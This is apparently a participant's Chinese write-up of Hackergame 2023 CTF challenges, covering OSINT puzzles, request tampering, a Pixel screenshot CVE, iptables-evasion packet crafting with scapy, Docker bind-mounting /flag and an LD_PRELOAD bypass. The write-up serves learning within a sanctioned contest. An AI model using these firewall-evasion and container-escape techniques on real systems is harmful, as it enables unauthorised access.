# HackerGame2023 WriteUp

又是一年的HackerGame，毕业了明年不知道还有没有空参与，也算是这四年来我做的最好的一次吧，圆满了。

去年写了writeup但是看了一遍感觉太水了没敢PR，今年想想一定要发出来（

## **Hackergame 启动**

~~拿着手机伸向前方，大声喊出 `Hackergame, 启动` 就完事了~~

按下F12，点击提交，发现有一个GET请求: `https://***.hack-challenge.lug.ustc.edu.cn:13202/?similarity=` ，改一下 `similarity=100` 就可以得到flag。

## **猫咪小测**

今年的猫咪问答感觉简单了不少

### 1. 想要借阅世界图书出版公司出版的《A Classical Introduction To Modern Number Theory 2nd ed.》，应当前往中国科学技术大学西区图书馆的哪一层？**（30 分）**

去 [lib.ustc.edu.cn](http://lib.ustc.edu.cn) 搜索了一下，没找到答案。不过从地图上看，科大图书馆层数并不多，每一个自然数都试一下就可以简单得知答案是12。

### 2. 今年 arXiv 网站的天体物理版块上有人发表了一篇关于「可观测宇宙中的鸡的密度上限」的论文，请问论文中作者计算出的鸡密度函数的上限为 10 的多少次方每立方秒差距？**（30 分）**

搜索 `可观测宇宙中的鸡的密度上限` 发现一个知乎链接

![Untitled](attachments/Untitled.png)

点进去发现账号被注销了，但是对下面的描述进行再次搜索可以找到[这个回答](https://www.zhihu.com/question/20337132/answer/3023506910)，按照描述找到[原始论文](https://arxiv.org/abs/2303.17626)即可得知答案是23。

### 3. 为了支持 TCP BBR 拥塞控制算法，在**编译** Linux 内核时应该配置好哪一条内核选项？**（20 分）**

就 `TCP BBR linux 编译 "CONFIG_"`  为keyword搜索可以得到很多相关文章，找到了 `CONFIG_TCP_CONG_BBR` 。

### 4. 🥒🥒🥒：「我……从没觉得写类型标注有意思过」。在一篇论文中，作者给出了能够让 Python 的类型检查器 ~~MyPY~~ mypy 陷入死循环的代码，并证明 Python 的类型检查和停机问题一样困难。请问这篇论文发表在今年的哪个学术会议上？**（20 分）**

之前有看过关于这个的HackerNews，但是再去翻历史记录的时候反而找不到了。最后用 `mypy coferene` 为关键词(是的你没看错，我确实打错了)搜索一年内的文章找到了[这个](https://drops.dagstuhl.de/opus/volltexte/2023/18237/pdf/LIPIcs-ECOOP-2023-44.pdf)。在PDF结尾可以看到会议名称 `ECOOP` 。

![Untitled](attachments/Untitled%201.png)

## **更深更暗**

F12打开控制台查看源码，发现有一段flag的生成代码，复制出来单独跑一次就得到了flag。

## **旅行照片 3.0**

> 感觉这才是今年的猫咪问答（加强版）
> 

下面以图[一-四]分别指代从上向下的第1-4张图片。

上午：

图一一眼即可辨认出来是诺贝尔奖牌，搜索下面的 `M.KOSHIBA` 可知这是诺贝尔物理学奖得主 `小柴 昌俊` 的奖牌。然而经过检索，并没有找到这枚奖章展览的所在地。不过推断得出，大概率是在东大的某个地方。

中午：

图二可以看出这是一个日式拉面店。就 `一信` 这两个汉字进行搜索，发现有一家很靠近东京大学的店。随后发现学长脖子上挂着标有 `STATPHYS28` 的牌子，搜索发现会议在东京大学举办，时间长达五天，可以认为照片拍摄日期也大概率在这附近。

图三是一个很经典的公园景色，结合描述 `当你们走到一座博物馆前时， 马路对面的喷泉和它周围的景色引起了你的注意` ，使用搜索引擎对图片进行搜索后结合地图发现这是位于上野公园内东京国立博物馆门前的 `上野公園 竹の台広場 (噴水広場)` 。

下午和夜晚：

这部分我差点想多了。一开始我还以为 `马里奥世界` 指的是环球的Super Nintendo World，看了半天JR桜島駅和ユニバーサルシティ駅旁边的大型建筑，感觉不对劲，仔细一想发现下午从上野到大阪最快也赶不上这个速度（~~而且谁会大晚上的去游乐园啊~~）。又看了一遍图片发现有 Nintendo Tokyo 字样，对图片进行搜索发现这是在渋谷的Nintendo Tokyo店。

与此同时，考虑学长 `算乘船欣赏东京的迷人夜景和闪耀的彩虹大桥` ，搜索发现[这篇文章](https://www.gltjp.com/zh-hans/directory/item/symphony-cruise/)提到东京湾交响乐号游轮有 `独家航线是从彩虹大桥和东京京门大桥正下方穿过，特点是能抬头仰望两座大桥极具迫力的景观` ，搜索发现该船是从 `〒105-0022 東京都港区海岸２丁目７−１０４` 开出的，然而搜索发现周围压根没有什么标志性建筑物。再次阅读题目发现提到了 `将继续他的学术之旅` ，联想到之前在 `SATAPHYS28` 的Gallery里看到了海上的照片，查阅Program Timetable得知Banquet环节位于八月10日下午，在東京大学安田講堂附近集合。

题目1-2:

由上，我们已经确定了这一天的日期是 `2023-08-10` 。然而仍未检索到该奖牌的展览所在地，采取笨办法：找到日本诺贝尔奖得主中最年轻的东京大学人士。经过数次尝试后确认这位是梶田隆章，在得奖时位于東京大学宇宙線研究所(ICRR)。

题目3-4:

前往上野公园的[官方网站](https://www.kensetsu.metro.tokyo.lg.jp/jimusho/toubuk/ueno/index_top.html)的[活动通知网页](https://www.kensetsu.metro.tokyo.lg.jp/jimusho/toubuk/ueno/event.html)查看，结果发现这里并没有记载历史活动，查询发现也没有包含8月的网页快照。不过就 `上野公園 8月10` 作为关键词进行搜索，可以发现有这个活动 **[`全国梅酒まつりin東京2023`](https://umeshu-matsuri.jp/tokyo_ueno/)** 发现时间正好符合要求。用工地日语水平找到了表格ID [`S495584522`](https://ws.formzu.net/dist/S495584522/) 。

在博物馆官网可以得知一般成年人门票1000日元，学生门票500日元。然而这两个答案都不对，检索发现了[东京大学对学生有特殊优惠](https://www.u-tokyo.ac.jp/ja/students/facility/h17.html)。所以答案是0日元。

题目5-6:

由对上述分析可以得知第五题的答案是 `安田讲堂`。

就 `ボタン&カフリンクス 上野` 作为关键词进行搜索，找到了[这个网页](https://plaza.rakuten.co.jp/ayumilife/diary/202308110000/)，所以前半部分答案是 `熊猫`；对于后半部分，就 `涩谷 3D` 为关键词进行搜索，发现答案是 `秋田犬`

## **赛博井字棋**

打开题目，查看每次的网页请求，发现当前状态其实存储在 JWT Token 中，不过就这个方向进行努力发现并没有什么成效。

过了段时间发现这道题做出来的人真的好多，重新审视了一遍，发现在自己发起请求的时候可以在之前下过棋子的地方重新下棋，推测没有做后端校验，于是简单用curl发起两个请求就好了，每次请求记得替换上一次返回的TOKEN。

## **奶奶的睡前 flag 故事**

观察到题目重点标注了 **`谷歌『亲儿子』`** 与 **`连系统都没心思升级`** 。想起来之前看到的关于pixel的一个CVE：**[CVE-2023-21036](https://nvd.nist.gov/vuln/detail/cve-2023-21036)** ，搜索发现一个[GitHub repo](https://github.com/infobyte/CVE-2023-21036)里提到了[一个网站](https://acropalypse.app/)可以复原截图，使用即可得到flag。

## **组委会模拟器**

查看网络链接发现网页会首先发起一次 `getMessages` 请求，返回包含消息列表和delay的json；每次点击撤回会发送一次 `deleteMessage` 请求；在请求结束后会发起一次 `getflag` 请求。由于每次撤回请求并没有携带状态，猜测服务端维护了一个timer。

写一个简单的js脚本可得到flag:

```jsx
const {setTimeout} = require("timers/promises")

const cookie = ""

async function deleteMessage(messageId, message, startTime) {
  await setTimeout(message.delay * 1000 + 500)
  const deltaTime = Date.now() - startTime
  const req = await fetch("http://202.38.93.111:10021/api/deleteMessage", {
    "headers": {
      "accept": "application/json, text/plain, */*",
      "accept-language": "en,zh-CN;q=0.9,zh;q=0.8",
      "content-type": "application/json",
      "proxy-connection": "keep-alive",
      "cookie": cookie,
      "Referer": "http://202.38.93.111:10021/",
      "Referrer-Policy": "strict-origin-when-cross-origin"
    },
    "body": `{\"id\":${messageId.toString()}}`,
    "method": "POST"
  })
  const data = await req.json()
  if (!data.success) {
    console.error({...message, deltaTime})
    throw new Error(data.error)
  }
  return data
}
function isFlagMessage(content) {
  const regex = /hack\[[a-z]*\]/
  return regex.test(content)
}

(async () => {
  const req = await fetch("http://202.38.93.111:10021/api/getMessages", {
    "headers": {
      "accept": "application/json, text/plain, */*",
      "accept-language": "en,zh-CN;q=0.9,zh;q=0.8",
      "proxy-connection": "keep-alive",
      "cookie": cookie,
      "Referer": "http://202.38.93.111:10021/",
      "Referrer-Policy": "strict-origin-when-cross-origin"
    },
    "body": null,
    "method": "POST"
  })
  const data = await req.json()
  const messages = data.messages
  const startTime = Date.parse(data.server_starttime) // in millisecond
  const deleteQueries = []
  messages.forEach((message, index) =>{
    if (isFlagMessage(message.text)) {
      deleteQueries.push(deleteMessage(index, message, startTime))
    }
  })
  await Promise.all(deleteQueries)
  const getFlagReq = await fetch("http://202.38.93.111:10021/api/getflag", {
    "headers": {
      "accept": "application/json, text/plain, */*",
      "accept-language": "en,zh-CN;q=0.9,zh;q=0.8",
      "proxy-connection": "keep-alive",
      "cookie": "session=eyJ0b2tlbiI6Ijk3Ok1FVUNJUURWMlkxeDIwMVRJb01WUEpjQm9oS1dYc2J3S3FEUDhiclREZlZSNUl4S293SWdNTUQwZmdBMWdQdUNiOUZNeStkRmR3ZGk2aklPL053Z3NtcElqb0h5TTBBPSJ9.ZTzhXg.4PEl-WpS6SLSHVfyKRSSUBsg9Q4",
      "Referer": "http://202.38.93.111:10021/",
      "Referrer-Policy": "strict-origin-when-cross-origin"
    },
    "body": null,
    "method": "POST"
  })
  const getFlag = await getFlagReq.json()
  console.log(`The final flag status is: `, getFlag)
})()
```

写Writeup的时候想了想，其实可以直接在网页上 `setInterval` 的。

## **虫**

之前有听说过SSTV，直接调[库](https://github.com/colaclanth/sstv)拿到flag。

## **JSON ⊂ YAML?**

稍微检索一下找到了[这个回答](https://stackoverflow.com/questions/21584985/what-valid-json-files-are-not-valid-yaml-1-1-files)，第一问使用 `12345e999` 拿到flag；第二问从题目及它所引用的YAML spec可知YAML1.2会对重复的key报错而JSON不会，因此输入 `{"a":1,"a":2}` 即可得到flag。

## **Git? Git!**

一眼reflog（~~这种错我犯过好多次了~~

首先在题目的git环境中执行 `git reflog` 可以得到:

```
ea49f0c (HEAD -> main) HEAD@{0}: commit: Trim trailing spaces
15fd0a1 (origin/main, origin/HEAD) HEAD@{1}: reset: moving to HEAD~
505e1a3 HEAD@{2}: commit: Trim trailing spaces
15fd0a1 (origin/main, origin/HEAD) HEAD@{3}: clone: from https://github.com/dair-ai/ML-Course-Notes.git
(END)
```

发现 `505e1a3` 就是对应的那个git commit. `git checkout 505e1a3` 过去，即可在 `readme.md` 里找到flag。

## **HTTP 集邮册**

挨个浏览[MDN 关于 HTTP Response Codes的文档](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status)可得：

```jsx
1.200
GET / HTTP/1.1\r\n
Host: example.com\r\n\r\n

2.404
GET /gdfhgdsh HTTP/1.1\r\n
Host: example.com\r\n\r\n

3.405
POST / HTTP/1.1\r\n
Host: example.com\r\n\r\n

4.505
POST / HTTP/2.0\r\n
Host: example.com\r\n\r\n

5.400
GET /index.html HTTP/1.1
Host: www.example.com

6.100
GET / HTTP/1.1\r\n
Host: example.com\r\n
Expect: 100-continue\r\n\r\n

7.412
HEAD / HTTP/1.1\r\n
Host: example.com\r\n
If-Match: "33a64df551425fcc55e4d42a148795d9f25f89d4"\r\n\r\n

8.304
GET / HTTP/1.1\r\n
Host: www.example.com\r\n
If-None-Match: "64dbafc8-267"\r\n\r\n

9.413
GET / HTTP/1.1\r\n
Host: example.com\r\n
Content-Type: video/h264\r\n
Content-Length: 1234567890987\r\n\r\n

10.206
GET / HTTP/1.1\r\n
Host: example.com\r\n
Range: bytes=200-1000\r\n\r\n

11.414
GET /{random_16k_chars} HTTP/1.1\r\n
Host: example.com\r\n\r\n

12.416
GET / HTTP/1.1\r\n
Host: example.com\r\n
Range: bytes=99999-100000000\r\n\r\n
```

关于无状态码，在搜索后发现HTTP/0.9 是没有 status line 设计的，而NGINX依然支持HTTP/0.9，所以输入

```jsx
GET /\r\n\r\n
```

即可拿到flag。

## **Docker for Everyone**

非特权容器也算是个老生常谈的问题了，在 `docker run` 的同时 mount flag 文件就可以在容器内 `cat /flag` 。

```bash
docker run -it --mount type=bind,source=/flag,target=/flag alpine
```

## **惜字如金 2.0**

看过程序后，发现确实和去年的题没有什么关系。

分析程序发现关键是复原 `code_dict` ，每一行都有一个字符被 XZRJification 掉了。看起来是可以找到唯一解的，不过做题的时候懒了，直接交给GPT暴力解了（

```jsx
const fs = require('node:fs')
const cliProgress = require('cli-progress')
const { log } = require('node:console')
const alphabets = [
    'A', 'B', 'C', 'D', 'E', 'F',
    'G', 'H', 'I', 'J', 'K', 'L',
    'M', 'N', 'O', 'P', 'Q', 'R',
    'S', 'T', 'U', 'V', 'W', 'X',
    'Y', 'Z'
]

const consonantAlphabets = alphabets
    .filter((alphabet) => !['A', 'E', 'I', 'O', 'U'].includes(alphabet))
    .map(alphabet => alphabet.toLowerCase())

let code_dict = []
code_dict.push('nymeh1niwemflcir}echaet')
code_dict.push('a3g7}kidgojernoetlsup?h')
code_dict.push('ulw!f5soadrhwnrsnstnoeq')
code_dict.push('ct{l-findiehaai{oveatas')
code_dict.push('ty9kxborszstguyd?!blm-p')

const decodeMap = [53, 41, 85, 109, 75, 1, 33, 48, 77, 90,
    17, 118, 36, 25, 13, 89, 90, 3, 63, 25,
    31, 77, 27, 60, 3, 118, 24, 62, 54, 61,
    25, 63, 77, 36, 5, 32, 60, 67, 113, 28]

function checkXZRJCount(word) {
    let possibilities = []
    word = word.split('')
    word.forEach((letter, index, arr) => {
        if (consonantAlphabets.includes(letter.toLowerCase())) {
            possibilities.push(arr.toSpliced(index, 0, letter.toLowerCase()))
            possibilities.push(arr.toSpliced(index, 0, letter.toUpperCase()))
        }
    })
    if (consonantAlphabets.includes(word[word.length - 1].toLowerCase())) {
        possibilities.push([...word, 'e'])
        possibilities.push([...word, 'E'])
    }
    possibilities = possibilities.map(possibility => possibility.join(''))
    return possibilities
}

code_dict = code_dict.map(code => checkXZRJCount(code))
const bar = new cliProgress.SingleBar({})
bar.start(code_dict.map(code => code.length).reduce((pre, cur) => pre * cur, 1), 0)

function* combineGenerator(dict, depth = 0, current = []) {
    if (depth === dict.length) {
        yield current.slice();  // 使用 slice() 来复制数组
        return;
    }

    for (let i = 0; i < dict[depth].length; i++) {
        current.push(dict[depth][i]);
        yield* combineGenerator(dict, depth + 1, current);
        current.pop();
    }
}

const combinationGenerator = combineGenerator(code_dict);

// 逐个处理每种组合
for (let combination of combinationGenerator) {
    const codes = combination.join('')
    const answer = decodeMap.map(index => codes[index]).join('')
    // log(answer)
    if (answer.startsWith('flag{') && answer.endsWith('}')) {
        console.log(`answer: `, answer)
        fs.appendFileSync('./results.txt', `${answer}\n`)
    }
    bar.increment()
}

bar.stop()
console.log(`Over`)
```

虽然这样干没剪枝结果有点多[1]，不过大多数是重复的，稍微找寻一下就找到了正确的flag，非常成功，可喜可贺！

[1]: 一共132560个解

![Untitled](attachments/Untitled%202.png)

## **高频率星球**

由于平常我是打开了 iTerm2 的 Unlimited scrollback 的，~~只要我手速足够快~~，我就可以直接复制 `asciinema play` 的输出。

## **小型大语言模型星球**

只做出来第一问，忘记prompt怎么构造的了:(

## **流式星球**

把 `create_video.py` 交给ChatGPT就可以得到 `decode.py` 。

```python
import cv2
import numpy as np

def recreate_video(input_file, output_file, frame_width, frame_height):
    # 读取二进制数据
    with open(input_file, "rb") as file:
        buffer = np.fromfile(file, dtype=np.uint8)

    # 确定帧的大小
    frame_size = frame_width * frame_height * 3  # 3 代表 RGB

    # 计算缺少的数据量并尝试补全
    missing_data = frame_size - (len(buffer) % frame_size)
    if missing_data < frame_size:
        buffer = np.concatenate((buffer, np.zeros(missing_data, dtype=np.uint8)))

    # 重塑数据为视频帧
    frame_count = len(buffer) // frame_size
    buffer = buffer.reshape((frame_count, frame_height, frame_width, 3))

    # 初始化视频写入器
    out = cv2.VideoWriter(
        output_file, cv2.VideoWriter_fourcc(*"mp4v"), 30, (frame_width, frame_height)
    )

    # 将帧写入视频
    for i in range(frame_count):
        out.write(buffer[i])

    out.release()

if __name__ == "__main__":
    recreate_video("video.bin", f"recreated_video.mp4", frame_width=480, frame_height=320)
    # 假设我们知道原始视频的宽度和高度
   
```

但是不知道视频的宽高怎么办呢？

事实上 480x320 已经足够我们连蒙带猜得到flag了：

![Untitled](attachments/Untitled%203.png)

不过在做题的时候，由于typo，我依然没拿到正确的flag。那么怎么办呢？笨办法当然是一个一个看（

```python
for j in range(360, 720):
        i = int(j * 4 / 3)
        recreate_video("video.bin", f"recreated_video{i}x{j}.mp4", frame_width=i, frame_height=j)
    # for i in range(635,645):
    #     for j in range(475,485):
    #         # if i % 10 == 0 or j % 10 ==0:
    #         #     continue
    #         recreate_video("video.bin", f"recreated_video{i}x{j}.mp4", frame_width=i, frame_height=j)
```

最后发现854x641的时候可以正确辨认出flag：

![Untitled](attachments/Untitled%204.png)

> ~~看MyGo看的~~
> 

## **低带宽星球**

第一问：搜索 `png 无损 压缩` 找到了[https://tinify.cn/](https://tinify.cn/)，对图片压缩后大小为1.2KiB，得到flag；

第二问：大概看了一下libvips，感觉是需要在libvips支持的文件格式上做文章，无奈看了半天也没找到合适的文件格式。

## **Komm, süsser Flagge**

> 原来这题还有附件啊，啊哈哈
> 

第一问：

检索到了[这个回答](https://serverfault.com/questions/1141991/what-is-the-difference-bm-and-kmp-algorithms-in-iptables-string-search)，提到了[这个commit](https://git.kernel.org/pub/scm/linux/kernel/git/netfilter/nf.git/commit/?id=6f67fbf8192da80c4db01a1800c7fceaca9cf1f9)，看了半天没看懂（

最后还是GPT告诉我可以考虑把POST分开来发：

```jsx
import { Socket } from 'node:net';

const client = new Socket()
client.connect(18080, '202.38.93.111')

client.on('data', (data) => console.log(data.toString()))

client.write('PO')
client.write("ST / HTTP/1.1\r\nHost: example.com\r\nContent-Length: 99\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n{TOKEN}\r\n");
```

第二问：

搜索发现这个 [tutorial](http://www.stearns.org/doc/iptables-u32.current.html) ，照着学了一会儿，然后发现题目给的 `"0 >> 22 & 0x3C @ 12 >> 26 @ 0 >> 24 = 0x50"` 和这题给的demo有点像啊。那么是哪里不一样呢？答案是少了 `&0x3C` 部分，发现这一部分刚好是 TCP reseverd bits 的位置。那么答案就很简单了，只要想办法构造一个 reseverd bits 全1的请求就可以了。

但是构造这个请求花了不少时间，由于阿斌的计网成绩并不理想，只能依赖搜索引擎和GPT来得到答案。搜索得到了[这个答案](https://stackoverflow.com/questions/4134925/access-and-change-the-reserved-bits-on-tcp-header)，提到有三种可能的解。由于阿斌还是Linux苦手，在进行了若干次尝试后，不得不放弃了抓包并修改的想法，转为构造TCP包。

查阅文档并使用GPT后写出来了这个（姑且能用的）的程序：

```python
from scapy.all import *

# 设置目标IP地址和端口
target_ip = "202.38.93.111"
target_port = 18081

# 构建一个IP包
ip = IP(dst=target_ip)

# 构建一个TCP包
tcp = TCP(sport=RandShort(), dport=target_port, flags="S")

# 发送TCP握手包
tcp_synack = sr1(ip/tcp)

# 构建HTTP GET请求
get_request = "POST / HTTP/1.1\r\nHost: " + target_ip + "\r\nContent-Length: 99\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n{TOKEN}\r\n"

# 设置TCP响应和ACK
tcp = TCP(sport=tcp_synack[TCP].dport, dport=target_port, flags="A", seq=tcp_synack[TCP].ack, ack=tcp_synack[TCP].seq + 1)
tcp.reserved = 7

# 发送HTTP GET请求
send(ip/tcp/Raw(load=get_request))
```

一开始我还是在macOS上跑这个脚本的，抓包发现总会有一个RST发出去，但是搜索发现在macOS上好像没什么办法可以阻挡他。于是就换了 Arch 用 iptables reject 掉RST包，就拿到flag了。

第三问：

分析ip桌子指令，发现他要求在前 50 bytes 存在一个长度为 10 的 `GET / HTTP` 字符。查看RFC发现可以在 IP Options 字段来放下这一部分，于是对上面的代码稍作修改可得：

```python
from scapy.all import *

# 设置目标IP地址和端口
target_ip = "202.38.93.111"  # 替换为你的目标IP
target_port = 18082

# 构建一个IP包
ip = IP(dst=target_ip)

class IPOption_HTTP_GET(IPOption):
    name = "GETHTTP"
    option = 99  # 自定义选项类型，选择一个未被使用的值
    fields_desc = [
        ByteEnumField("option", 99, {99: "GETHTTP"}),
        ByteField("length", 12),  # 类型(1) + 长度(1) + 数据(10)
        StrFixedLenField("data", b"\x00" * 10, 10),  # 10字节的自定义数据
    ]

ip.options = IPOption_HTTP_GET(data=b"GET / HTTP")
print(ip.show())
# 构建一个TCP包
tcp = TCP(sport=RandShort(), dport=target_port, flags="S")

# 发送TCP握手包
tcp_synack = sr1(ip / tcp)

# 构建HTTP GET请求
# get_request = "GET / HTTP"
get_request = (
    "POST / HTTP/1.1\r\nHost: "
    + target_ip
    + "\r\nContent-Length: 99\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n{TOKEN}\r\n"
)

# 设置TCP响应和ACK
tcp = TCP(
    sport=tcp_synack[TCP].dport,
    dport=target_port,
    flags="A",
    seq=tcp_synack[TCP].ack,
    ack=tcp_synack[TCP].seq + 1,
)

# 发送HTTP GET请求
send(ip / tcp / Raw(load=get_request))
```

尝试运行后发现SYN发出去就没有回包，联想到题目说有的网络环境下无法解答，猜测可能是某层上级路由器阻止了带有 IP Options 的包。于是连接手机电信热点，拿到flag。

## **为什么要打开 /flag 😡**

第一问：

既然是LD_PRELOAD注入，那么只要静态链接就注入不到我啦。

用GO写一个简单的程序，交叉编译上传即可：

```go
package main

import (
	"fmt"
	"log"
	"os"
)

func main() {
	filePath := "/flag"

	data, err := os.ReadFile(filePath)
	if err != nil {
		log.Fatalf("Failed to read from file: %v", err)
	}

	fmt.Println(string(data))
}
```

之后在看第二问的时候发现用rust也能达到这样的效果，可是明明是动态链接的诶，不懂rust。

第二问：查到了TOCTOU，但是再往后就没有头绪了。

## **异星歧途**

打开游戏，乱点了一通（并炸掉n次）后发现了题目逻辑，结合[wiki](https://mindustry-unofficial.fandom.com/wiki/Guide:_Logic_Basics)对语句进行分析：

Part1: 非常简单的逻辑，看过一遍得到答案10100101;

Part2: 梳理了一下逻辑，发现本质上是在找一个0到15的满足平方的二进制最高位和第3位是0的自然数。简单写个程序算一下发现只有唯一解11000100;

```python
def get_bit(number, n):
    mask = 1 << n
    return (number & mask) >> n

for i in range(16):
    if get_bit(result := i**2, 2) & get_bit(result, 7) == 1:
        print(i, result, bin(result))
```

Part3: 一开始被旁边的控制炮台移动的模块迷惑了，此时Part4已经解出来了，于是打算试试暴力解，结果不小心写错了一位没有暴力出来。最后对游戏本身进行了一点研究，发现只要打开5和6让冷却液供上，随后打开1供应燃料即可，于是答案是10001100;

Part4: ~~这个不会爆炸~~，可以找规律，在稍作尝试后发现答案是01110111。

## 后记

看过官方的writeup之后，感觉好些题我能做出来还是运气好，这篇writeup也写的比较水，还是要学习一个.webp

衷心感谢组委会与各位staff带来的高质量题目，真的教会了我很多，也同样ChatGPT对这次解题的支持（